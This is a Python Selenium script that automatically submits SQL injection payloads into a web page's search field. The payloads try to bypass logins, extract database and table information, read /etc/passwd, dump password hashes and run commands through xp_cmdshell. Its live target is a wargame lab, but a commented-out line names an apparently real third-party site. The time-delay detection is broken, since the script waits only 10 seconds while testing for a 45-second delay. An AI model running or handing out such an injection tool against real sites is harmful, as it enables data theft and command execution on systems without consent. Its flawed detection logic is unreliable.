from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
import time


def find_search_bar(browser, url, method):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("name", "email"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']")
    ]
    if method:
        try_methods = method

    # Attempt to find and verify search bar in main content
    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar[0]:
        return found_search_bar

    # Fallback: attempt to find and verify search bar within frames
    browser.switch_to.default_content()  # Ensure starting from the main document
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar and found_search_bar[
                0]:  # Check if found_search_bar is not None and has a found element
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()  # Always switch back to the main content after each frame

    print("Search bar not found in any frame or the main content.")
    return [None, None, None]


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar[0]:
            return search_bar
    return [None, None, None]  # Ensure it returns a list even when not found


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        # Verify it's interactable
        try:
            search_bar.send_keys("Test")
            search_bar.clear()  # Clear the test input
            print(f"Found interactable search bar using {method}='{value}'.")
            return [search_bar, method, value]
        except ElementNotInteractableException:
            print(f"Search bar found but not interactable using {method}='{value}'.")
            return [None, None, None]
    except (NoSuchElementException, TimeoutException) as e:
        print(f"Search bar not found using {method}='{value}'.")
        # Reason: {e}")
        return [None, None, None]


def test_sqli_payloads(browser, url):
    # Categorize payloads into response-dependent and time-based
    response_dependent_payloads = [
        "'",  # Basic test for SQL injection vulnerabilities.
        "1' OR '1'='1",  # Attempts to bypass authentication or retrieve records.
        "' UNION SELECT NULL,version(),current_user,database()-- -",  # Extract info
        "' UNION ALL SELECT ALL @@version, NULL, NULL, NULL-- -",  # Extracts the database version.
        "' OR 1=1-- -",  # Simple OR condition to test for unfiltered execution.
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --",  # Number of tables
        "' UNION SELECT NULL,table_name FROM information_schema.tables-- -",  # List all tables
        "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')-- -",
        # Check username with wildcard password.
        "' UNION SELECT load_file('/etc/passwd'), NULL, NULL, NULL-- -",  # Read system file (Linux).
        "' UNION SELECT NULL, user_password_hash FROM users-- -"  # Retrieve user password hashes.
    ]

    time_based_payloads = [
        "' OR SLEEP(45)-- -",  # MySQL; indicates vulnerability if response is delayed.
        "'; WAITFOR DELAY '0:0:45'--",  # SQL Server; similar to the above.
        "1'; EXEC xp_cmdshell('whoami')--",  # SQL Server; execute a command shell.
        "'; SELECT pg_sleep(45)--",  # PostgreSQL; tests for delay indicating execution.
        "1 PROCEDURE ANALYSE(EXTRACTVALUE(1234,CONCAT(0x3a,(SELECT version()))),1)-- -",
        # Complex extraction with delay.
    ]

    results = []
    exceptions = []

    # Function to analyze response for error messages
    def analyze_response(browser):
        error_indicators = [
            "you have an error in your sql syntax;",
            "warning: mysql_fetch",
            "unclosed quotation mark",
            "microsoft ole db provider for sql server error '80040e14'",
            "unclosed quotation mark after the character string",
            "pg::syntaxerror",
            "org.hibernate.exception.sqlgrammarexception:"
        ]
        page_source = browser.page_source.lower()

        for error in error_indicators:
            if error in page_source:
                return True, "Potential SQL Injection vulnerability detected due to error message."
        return False, "No clear vulnerability detected based on error message checks."

    method = []
    search_bar = find_search_bar(browser, url, method)
    method = [(search_bar[1], search_bar[2])]

    # Handling response-dependent payloads
    for payload in response_dependent_payloads:
        try:
            search_bar = find_search_bar(browser, url, method)[
                0]  # Assuming find_search_bar returns a tuple with search_bar as the first element
            if search_bar is None:
                raise Exception("Search bar could not be found.")
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            time.sleep(5)  # Adjust based on expected page load time
            detected, result_message = analyze_response(browser)
            results.append((payload, result_message))
            browser.back()
            time.sleep(2)  # Adjust based on your observation for navigation
        except Exception as e:
            exceptions.append((payload, str(e)))

    # Handling time-based payloads
    for payload in time_based_payloads:
        try:
            start_time = time.time()
            search_bar = find_search_bar(browser, url, method)[0]
            if search_bar is None:
                raise Exception("Search bar could not be found.")
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            # Wait for a time longer than the expected delay to ensure detection
            time.sleep(10)  # Example for payloads with around 5 seconds delay
            elapsed_time = time.time() - start_time
            if elapsed_time - 45 > 3:  # Example threshold, adjust based on expected delay and acceptable variance
                results.append((payload, "Potential SQL Injection vulnerability detected through time delay."))
            else:
                results.append((payload, "No significant delay detected."))
            browser.back()
            time.sleep(2)
        except Exception as e:
            exceptions.append((payload, str(e)))

    for payload, exception_message in exceptions:
        print(f"Payload '{payload}': Exception - {exception_message}")

    return results


def check_sqli_in_searchbar():
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ignore-certificate-errors")
    browser = webdriver.Chrome(options=chrome_options)

    url = "https://redtiger.labs.overthewire.org/level2.php"
    # url = "http://www.icdcprague.org/index.php?id=10%27"

    try:
        search_bar = find_search_bar(browser, url, None)[0]
        if search_bar:
            print("Success: Search bar found.")
            results = test_sqli_payloads(browser, url)
            print("\nSQL Injection Test Results:")
            for payload, result in results:
                print(f"Payload '{payload}': {result}")
        else:
            print("Search bar not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
    finally:
        browser.quit()


if __name__ == '__main__':
    check_sqli_in_searchbar()
